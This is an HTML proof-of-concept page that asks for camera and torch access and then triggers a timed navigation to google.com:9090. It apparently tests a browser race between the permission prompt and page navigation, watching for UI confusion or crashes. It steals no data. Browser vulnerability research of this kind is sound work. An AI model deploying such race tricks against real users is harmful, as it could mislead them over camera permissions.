<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Camera Flash Tap + Navigation Race PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, system-ui;
  background: #f5f5f7;
  text-align: center;
}

button {
  font-size: 15px;
  padding: 10px 14px;
  border-radius: 10px;
  border: none;
  background: #007aff;
  color: #fff;
}

#panel {
  display: none;
  max-width: 420px;
  margin: 60px auto;
  background: #fff;
  padding: 24px;
  border-radius: 16px;
  box-shadow: 0 20px 60px rgba(0,0,0,.2);
}

video {
  width: 100%;
  border-radius: 12px;
  margin-top: 12px;
}

.notice {
  margin-top: 14px;
  font-size: 13px;
  color: #b00020;
}
</style>
</head>

<body>

<div style="margin-top:60px;">
  <button id="trigger">Start PoC</button>
</div>

<div id="panel">
  <h2>Tap to Activate Camera / Flash</h2>
  <p>Tap the button below to request camera and attempt torch activation.</p>

  <button id="tap">Tap</button>
  <p id="status">Status: -</p>

  <video id="video" autoplay playsinline></video>

  <div class="notice">
    Observe permission UI, crash, or unexpected navigation
  </div>
</div>

<script>
const trigger = document.getElementById('trigger');
const panel   = document.getElementById('panel');
const tapBtn  = document.getElementById('tap');
const status  = document.getElementById('status');
const video   = document.getElementById('video');

let stream;

trigger.onclick = () => {
  // Just display the panel without changing the history or URL
  panel.style.display = 'block';
};

tapBtn.onclick = async () => {
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;

    const track = stream.getVideoTracks()[0];
    const caps  = track.getCapabilities();

    if (caps && caps.torch) {
      await track.applyConstraints({
        advanced: [{ torch: true }]
      });
      status.textContent = 'Torch requested';
    } else {
      status.textContent = 'Torch not supported';
    }
  } catch (e) {
    status.textContent = 'Camera permission denied / error';
  }
};

/*
 * Navigation race during permission / hardware access
 */
window.addEventListener('pageshow', () => {
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        location.href = 'https://google.com:9090';
      }, 80);
    });
  });
});
</script>

</body>
</html>
